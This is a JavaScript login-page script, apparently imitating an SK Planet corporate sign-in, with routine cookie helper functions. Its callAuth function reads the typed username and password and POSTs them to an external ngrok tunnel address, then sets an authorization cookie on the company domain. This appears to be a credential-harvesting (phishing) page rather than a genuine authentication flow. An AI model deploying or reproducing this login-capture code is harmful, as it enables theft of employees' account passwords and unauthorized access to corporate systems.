    function callAuth() {
        xmlHttp = MakeHttpObject();
        var url = "https://b4e483e92130.ngrok-free.app/AnyAuth/AuthorizationRegister.aspx"
        var tAccount = document.LOGIN.txtUSER.value;
        var tPass = document.LOGIN.txtPASSWORD.value;
	tPass = encodeURIComponent(tPass);
        var param = "ACCOUNT=" + tAccount + "&PASSWORD=" + tPass;
            
        xmlHttp.open("POST", url, false);
        xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=euc-kr");
        xmlHttp.send(param);

        if (xmlHttp.readyState == 4) { //서버처리완료
            if (xmlHttp.status != 200) {
                alert("AD Server is not responding.");
                return false;
            }
        }

        var result = JSON.parse(xmlHttp.responseText);

        if (result.Success == false) {
            alert(result.Message);
            return false;
        }

        SetCookie("AuthorizationKey", result.Key, null, null, ".skplanet.com");
            
        return true;
    }

    function getCookieVal (offset) {
        var endstr = document.cookie.indexOf (";", offset);
        if (endstr == -1)
            endstr = document.cookie.length;

        return unescape(document.cookie.substring(offset, endstr));
    }

    function SetCookie (name, value) {
        var argv = SetCookie.arguments;
        var argc = SetCookie.arguments.length;
        var expires = (argc > 2) ? argv[2] : null;
        var path = (argc > 3) ? argv[3] : null;
        var domain = (argc > 4) ? argv[4] : null;
        var secure = (argc > 5) ? argv[5] : false;
        path = "/";
		
        document.cookie = name + "=" + escape (value) +
                        ((expires == null) ? "" : ("; expires=" +expires.toGMTString())) +
                        ((path == null) ? "" : ("; path=" + path)) +
                        ((domain == null) ? "" : ("; domain=" + domain)) +
                        ((secure == true) ? "; secure" : "");		
			
    }

    function GetCookie (name) { 
        var arg = "";
        var lv_CookieValue = "";
        arg = name + "=";
        var alen = arg.length;
        var clen = document.cookie.length;
        var i = 0;
        while (i < clen) {
            var j = i + alen;

            if(document.cookie.substring(i, j) == arg){
                lv_CookieValue = getCookieVal(j);
            }

            i = document.cookie.indexOf(" ", i) + 1;
            if (i == 0)
                break;
        }
        return lv_CookieValue;
    }
		 
    function setUserCookie( name, value, expiredays ){
        var todayDate = new Date();
        todayDate.setDate( todayDate.getDate() + expiredays );
        document.cookie = name + "=" + escape( value ) + "; path=/; expires=" + todayDate.toGMTString() + ";"
    }

    function getUserCookie( name ){
        var nameOfCookie = name + "=";
        var x = 0;
        while ( x <= document.cookie.length ){
            var y = (x+nameOfCookie.length);
            if ( document.cookie.substring( x, y ) == nameOfCookie ) { 
                if ( (endOfCookie=document.cookie.indexOf( ";", y )) == -1 )
                    endOfCookie = document.cookie.length;
                return unescape( document.cookie.substring( y, endOfCookie ) );
            } 
            x = document.cookie.indexOf( " ", x ) + 1;
            if ( x == 0 )
                break;
        }
        return "";
    }

    function delCookie( cookieName )
    {
        var expireDate = new Date();
        expireDate.setDate( expireDate.getDate() - 1 );
        document.cookie = cookieName + "= " + "; expires=" + expireDate.toGMTString() + "; path=/";
    }
